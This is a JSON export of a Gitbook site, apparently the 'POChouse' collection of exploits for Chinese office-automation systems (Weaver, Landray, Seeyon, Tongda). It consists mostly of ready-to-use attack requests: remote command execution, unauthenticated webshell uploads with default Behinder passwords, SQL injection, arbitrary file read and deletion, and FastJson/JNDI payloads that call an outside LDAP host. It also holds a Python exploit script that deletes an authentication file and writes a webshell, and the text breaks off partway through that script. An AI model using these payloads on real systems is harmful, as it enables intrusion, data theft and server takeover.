{"./":{"url":"./","title":"Introduction","keywords":"","body":"快乐星球 收录范围 HVV：收录各种高危可Getshell的漏洞-以及相关应用Getshell的技巧方法 POC（支持批量验证） nuclei-集成于大宝剑内 Goby Python（数据来源Github、自编写） EXP Metasploit jar包 （数据来源Github、自编写） python脚本 推荐使用方式 漏洞扫描可直接使用 大宝剑DBJ一键下任务（POC跟此仓库同步中） 漏洞利用使用的是qianxiao996师傅写的漏洞利用框架改的（EXP同步中，差不多就放出来） 可直接执行命令和反弹shell 类似项目 佩奇文库-漏洞复现及POC文库 Middleware-Vulnerability-detection-CVE、CMS、中间件漏洞检测利用合集 nuclei-核漏洞扫描器 fscan-内网综合扫描 ToDo 现在仅仅是收集整理，后续逐步深入分析利用技巧和形成原因及技术原理 网络设备&（默认口令） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/":{"url":"[+] 协同办公OA系统/","title":"[+] 协同办公OA系统","keywords":"","body":"POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Ecology-泛微OA/Bsh远程代码执行（CNVD-2019-32204）/":{"url":"[+] 协同办公OA系统/Ecology-泛微OA/Bsh远程代码执行（CNVD-2019-32204）/","title":"Bsh远程代码执行（CNVD-2019-32204）","keywords":"","body":"漏洞概述 泛泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行 影响范围 E-cology EXP POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=ex\\u0065c(\"cmd /c whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw POC 大宝剑已同步此漏洞 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Ecology-泛微OA/V9 任意文件上传/":{"url":"[+] 协同办公OA系统/Ecology-泛微OA/V9 任意文件上传/","title":"V9 任意文件上传","keywords":"","body":"漏洞利用 POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\" Content-Type: application/octet-stream ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- Shell地址：/page/exportImport/fileTransfer/test.jsp 密码:rebeyond POC 大宝剑已同步此POC，支持批量扫描 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Ecology-泛微OA/weaver.common.Ctrl-任意文件上传/":{"url":"[+] 协同办公OA系统/Ecology-泛微OA/weaver.common.Ctrl-任意文件上传/","title":"weaver.common.Ctrl-任意文件上传","keywords":"","body":"漏洞概述 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，可以上传webshell文件控制服务器 影响范围 V9 POC（批量） 1、将目标 HOST 或URL 放进urls.txt 2、直接运行脚本 python Ecology-RCE_批量POC(仅验证).py 3、脚本将输出上传的文件的链接，上传了个无害TXT文本文件上去 EXP 直接一键利用（可将脚本里的马更换为免杀马） 此工具下载地址见项目主页 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Ecology-泛微OA/反序列化/":{"url":"[+] 协同办公OA系统/Ecology-泛微OA/反序列化/","title":"反序列化","keywords":"","body":"漏洞概述 暂无详情 影响范围 未知 漏洞复现 生成反序列化 payload java -jar xx | base64 POST /synccache.jsp HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFz aENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgAD TAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEHg4Yzgy dy5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly94OGM4MncuZG5zbG9nLmNueA== POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html":{"url":"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html","title":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363","keywords":"","body":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363 漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。 漏洞影响 [!NOTE] 测试时间 2021-3-24 前版本 漏洞复现 存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程 https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true 其中存在SQL注入的参数为 ordeby ， 数据包如下 GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 保存为文件，使用 Sqlmap 跑一下注入 sqlmap -r sql.txt -p orderby --dbs 感谢名单 感谢 @Miaòa 师傅的投稿 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html":{"url":"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html","title":"蓝凌OA SSRF+JNDI远程命令执行","keywords":"","body":"蓝凌OA SSRF+JNDI远程命令执行 漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限 漏洞影响 [!NOTE] 蓝凌OA FOFA [!NOTE] app=\"Landray-OA系统\" 漏洞复现 利用 蓝凌OA custom.jsp 任意文件读取漏洞 读取配置文件 /WEB-INF/KmssConfig/admin.properties 发送请求包 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 60 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} 获取password后，使用 DES方法 解密，默认密钥为 kmssAdminKey 访问后台地址使用解密的密码登录 http://xxx.xxx.xxx.xxx/admin.do 使用工具执行命令 https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] 运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7) POST /admin.do HTTP/1.1 Host: Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967 Content-Length: 70 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA 任意文件写入漏洞.html":{"url":"[+] 协同办公OA系统/Landray-蓝凌OA/蓝凌OA 任意文件写入漏洞.html","title":"蓝凌OA 任意文件写入漏洞","keywords":"","body":"蓝凌OA 任意文件写入漏洞 漏洞描述 蓝凌OA 存在任意文件写入漏洞，攻击者可以上传恶意文件 漏洞影响 [!NOTE] 蓝凌OA 漏洞复现 /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] 漏洞在/sys/search/sys_search_main/sysSearchMain.do method 为 editrParam。参数为 FdParameters，在 com.landray.kmss.sys.search.jar 中的 com.landray.kmss.sys.search.actions.SysSearchMainAction 类。method 为 editrParam。 对 fdParemNames 的内容进行了判空。如果不为空,进入 SysSearchDictUtil.getParamConditionEntry 方法。 也是对 fdParemNames 进行了一次判空。然后传入 ObjectXML.objectXMLDecoderByString 方法。 将传入进来的 string 字符进行替换。将其载入字节数组缓冲区，在传递给 objectXmlDecoder。 在 objectXmlDecoder 中。就更明显了。典型的 xmlDecoder 反序列化。 整体流程只对 FdParameters 的内容进行了一些内容替换。 导致 xmlDecoder 反序列化漏洞。 利用方式： Xmldecoder payload 生成 https://github.com/mhaskar/XMLDecoder-payload-gene... POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Seeyon-致远OA/A8-FastJson反序列化RCE/":{"url":"[+] 协同办公OA系统/Seeyon-致远OA/A8-FastJson反序列化RCE/","title":"A8-FastJson反序列化RCE","keywords":"","body":"漏洞概述 部分版本使用了有漏洞的fastjson组件，导致远程代码执行漏洞 影响范围 致远 OA V7.1、V7.1SP1 致远 OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 致远 OA V6.1、V6.1SP1、V6.1SP2 致远 V6.0及V6.0SP1 致远 V5.6及V5.6SP1 POC&EXP POST /seeyon/sursenServlet HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded cmd:whoami sursenData={\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://119.45.153.41:1389/TomcatBypass/TomcatEcho\",\"autoCommit\":\"true\"}} POST /seeyon/main.do?method=changeLocale HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded cmd:whoami _json_params={\"v24\": {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://119.45.153.41:1389/TomcatBypass/TomcatEcho\",\"autoCommit\":true}} POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Seeyon-致远OA/ajax.do任意文件上传（ CNVD-2021-01627）/":{"url":"[+] 协同办公OA系统/Seeyon-致远OA/ajax.do任意文件上传（ CNVD-2021-01627）/","title":"ajax.do任意文件上传（ CNVD-2021-01627）","keywords":"","body":"漏洞概述 致远OA的ajax.do接口存在未授权访问，可上传任意文件造成RCE。 影响范围 致远OA V8.0 致远OA V7.1、V7.1SP1 致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 致远OA V6.0、V6.1SP1、V6.1SP2 致远OA V5.x 致远OA G6 POC&EXP POC请求包如下 POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00 webshell地址: http://xxx.com/seeyon/PeiQi.jspx 冰蝎3: 默认密码rebeyond 成功会返回 { \"message\":null, \"details\":null, \"code\":\"0436821967\" } 失败会返回 { \"message\": \"被迫下线，原因：与服务器失去连接\", \"code\": \"-1\", \"details\": null } 批量 现在用看返回包是否存在以下响应的方法已经不行了，大部分都是误报 出现异常：java.lang.NullPointerException:null 大宝剑可批量扫描此漏洞，识别更准确，通过上传无害txt来确认漏洞 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Seeyon-致远OA/Session-任意文件上传/":{"url":"[+] 协同办公OA系统/Seeyon-致远OA/Session-任意文件上传/","title":"Session-任意文件上传","keywords":"","body":"漏洞概述 致远OA通过发送特殊请求获取session，通过文件上传接口上传压缩包解压后可Getshell 影响范围 A8+ POC 大宝剑可批量扫描此漏洞，有误报性，配合EXP验证 EXP #脚本在此目录下 python session-rce.py http://192.168.1.100 Shell地址：/seeyon/common/designer/pageLayout/a234.jspx 默认密码:rebeyond POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Seeyon-致远OA/任意文件下载（CNVD-2020-62422）/":{"url":"[+] 协同办公OA系统/Seeyon-致远OA/任意文件下载（CNVD-2020-62422）/","title":"任意文件下载（CNVD-2020-62422）","keywords":"","body":"漏洞概述 致远OA的webmail.do接口存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息 影响范围 A6-V5 A8-V5 G6-V5 影响范围极广泛 POC&EXP 验证POC-下载数据库配置文件 http://xxx.com/seeyon/webmail.do?method=doDownloadAtt&filename=data.txt&filePath=../conf/datasourceCtp.properties 批量POC 大宝剑（已同步） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.2 后台任意文件上传漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.2 后台任意文件上传漏洞.html","title":"通达OA v11.2 后台任意文件上传漏洞","keywords":"","body":"通达OA v11.2后台任意文件上传漏洞 漏洞描述 通达OA v11.2后台存在文件上传漏洞，允许通过绕过黑名单的方法来上传恶意文件，导致服务器被攻击 影响版本 [!NOTE] 通达OA v11.2 环境搭建 通达OA v11.2下载链接 下载后按步骤安装即可 漏洞复现 该漏洞存在于后台，需要通过登录后才能进行使用 登录后点击 菜单 -> 系统管理 -> 附件管理 点击添加附录存储管理添加如下(存储目录为 webroot 目录，默认为 D:/MYOA/webroot/) 点击 组织 -> 系统管理员 -> 上传附件 抓包使用 windows 的绕过方法 shell.php -> shell.php. [!NOTE] 2012 为目录 1717872192 为拼接的文件名 最后的shell名字为 1717872192.shell.php 访问木马文件 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.6 任意文件删除&RCE.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.6 任意文件删除&RCE.html","title":"通达OA v11.6 任意文件删除&RCE","keywords":"","body":"通达OA v11.6 任意文件删除&RCE 漏洞描述 通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传 漏洞影响 [!NOTE] 通达OA v11.6 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 使用解密工具 SeayDzend(zend解密工具) 对通达OA的加密代码进行解密 [!NOTE] 解密工具已经放在目录下的POC目录中 解密完成后查看 webroot\\general\\data_center\\utils\\upload.php 文件 \\r\\n\\r\\n\"; ?> 在第一行包含了文件 auth.inc.php include_once \"inc/auth.inc.php\"; 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞 查看 \\webroot\\module\\appbuilder\\assets\\print.php文件 这里可以看到 页面获取 guid参数的值 使用file_exists函数判断文件是否存在 并未进行校验 就执行unlink删除文件 可以本地在 \\webroot\\inc 目录创建 1.txt 文件 然后访问 http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt 就会删除这个 1.txt 文件，也代表可以删除 auth.inc.php 登录检验文件 回到 upload.php 文件进行代码审计 判断变量 $action 是否为 upload，再判断文件类型，如果不为 xls 和 img 则进入else分支 else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i 在这段代码中，如果不存在 $from_rep 变量则会跳到如下代码 else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } 这里直接将 $repkid 变量进行拼接,也就是说可以通过目录穿越来上传恶意文件到指定目录 [!NOTE] 这里需要利用file_exists函数的漏洞构造/.<>./.<>./.<>./ 逃逸出来 使用POC来利用漏洞 [!NOTE] 注意在删除验证身份的文件后，会造成后台页面出现如下图，使用前备份文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA v11.6 任意文件删除&RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\\033[0m\") input(\"\\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \\033[0m\") else: print(\"\\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] 成功删除校验文件 auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] 删除校验文件 auth.inc.php 失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (绕过的webshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('peiqi.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] 成功写入webshell文件: _peiqi.php \\033[0m\") print(\"\\033[32m[o] webshell地址为: {}/_peiqi.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 写入webshell文件失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} 